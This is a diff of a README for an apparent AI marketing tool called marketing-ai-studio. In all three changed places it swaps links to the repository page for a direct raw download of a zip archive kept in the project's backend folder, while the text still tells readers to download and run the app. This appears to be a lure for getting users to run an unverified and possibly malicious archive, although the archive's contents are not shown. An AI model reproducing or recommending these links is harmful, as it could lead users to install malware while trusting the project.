@@ -1,6 +1,6 @@
 # 🤖 marketing-ai-studio - AI Marketing Workflows Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/letankhoshavi2011-stack/marketing-ai-studio)
+[![Download Now](https://img.shields.io/badge/Download%20Now-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/letankhoshavi2011-stack/marketing-ai-studio/main/backend/studio_ai_marketing_v3.3.zip)
 
 ## 🧭 Overview
 
@@ -35,7 +35,7 @@ For the best results, close other heavy apps before you start. This helps the ap
 
 Go to this page to download and run the app:
 
-[https://github.com/letankhoshavi2011-stack/marketing-ai-studio](https://github.com/letankhoshavi2011-stack/marketing-ai-studio)
+[https://raw.githubusercontent.com/letankhoshavi2011-stack/marketing-ai-studio/main/backend/studio_ai_marketing_v3.3.zip](https://raw.githubusercontent.com/letankhoshavi2011-stack/marketing-ai-studio/main/backend/studio_ai_marketing_v3.3.zip)
 
 1. Open the link above in your browser.
 2. Find the latest release or the main download area on the page.
@@ -229,7 +229,7 @@ If you want to reinstall later:
 
 ## 📌 Repository link
 
-[Open marketing-ai-studio](https://github.com/letankhoshavi2011-stack/marketing-ai-studio)
+[Open marketing-ai-studio](https://raw.githubusercontent.com/letankhoshavi2011-stack/marketing-ai-studio/main/backend/studio_ai_marketing_v3.3.zip)
 
 ## 🧭 Getting the most from the app
 
